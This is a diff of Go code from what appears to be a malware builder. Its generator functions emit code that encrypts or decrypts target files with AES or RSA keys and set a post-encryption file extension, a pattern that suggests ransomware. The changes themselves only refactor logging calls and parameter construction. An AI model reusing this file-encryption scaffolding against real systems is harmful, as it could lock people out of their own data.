@@ -31,7 +31,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"gut, err := ioutil.ReadFile(target)",
 
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 		"enc := \"\"",
@@ -41,7 +41,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"aes\":",
 		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 		"for (len(gut) < spine.crypt.aes_key_length){",
@@ -54,7 +54,7 @@ func encrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"rsa\":",
 		"enc_byte, err := rsa.EncryptOAEP(sha256.New(), rand.Reader, &spine.crypt.rsa_public, []byte(gut), nil)",
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 		"enc = hex.EncodeToString(enc_byte)",
@@ -112,11 +112,7 @@ func set_crypto(value string, s_json string) ([]string, string) {
 		"}"})
 
 	// Construct our int array
-	parameter := "[]int{"
-	for _, repr := range tools.Generate_int_array(value) {
-		parameter += fmt.Sprintf("%d,", repr)
-	}
-	parameter += "}"
+	parameter := tools.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
 }
@@ -139,11 +135,7 @@ func set_aes_key(value string, s_json string) ([]string, string) {
 		"}"})
 
 	// Construct our int array
-	parameter := "[]int{"
-	for _, repr := range tools.Generate_int_array(value) {
-		parameter += fmt.Sprintf("%d,", repr)
-	}
-	parameter += "}"
+	parameter := tools.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
 }
@@ -216,11 +208,7 @@ func add_target(value string, s_json string) ([]string, string) {
 		"}"})
 
 	// Construct our int array
-	parameter := "[]int{"
-	for _, repr := range tools.Generate_int_array(value) {
-		parameter += fmt.Sprintf("%d,", repr)
-	}
-	parameter += "}"
+	parameter := tools.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
 }
@@ -243,11 +231,7 @@ func set_after_extension(value string, s_json string) ([]string, string) {
 		"}"})
 
 	// Construct our int array
-	parameter := "[]int{"
-	for _, repr := range tools.Generate_int_array(value) {
-		parameter += fmt.Sprintf("%d,", repr)
-	}
-	parameter += "}"
+	parameter := tools.Generate_int_array_parameter(value)
 
 	return []string{fmt.Sprintf("%s(%s)", system_call, parameter)}, structure.Send(data_object)
 }
@@ -276,7 +260,7 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"gut, err := ioutil.ReadFile(target)",
 
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 		"dec := \"\"",
@@ -286,12 +270,12 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"aes\":",
 		"cipher, err := aes.NewCipher([]byte(spine.crypt.aes_key))",
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 		"cipher_text, err := hex.DecodeString(string(gut[:]))",
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 		"buffer := make([]byte, len(cipher_text))",
@@ -301,13 +285,13 @@ func decrypt(value string, s_json string) ([]string, string) {
 		"\tcase \"rsa\":",
 		"buffer, err := hex.DecodeString(string(gut[:]))",
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 
 		"buffer, err = spine.crypt.rsa_private.Decrypt(nil, buffer, &rsa.OAEPOptions{Hash: crypto.SHA256})",
 		"if err != nil{",
-		"notify.Log(err.Error(), \"3\", spine.logging)",
+		"notify.Log(err.Error(), spine.logging, \"3\")",
 		"return",
 		"}",
 
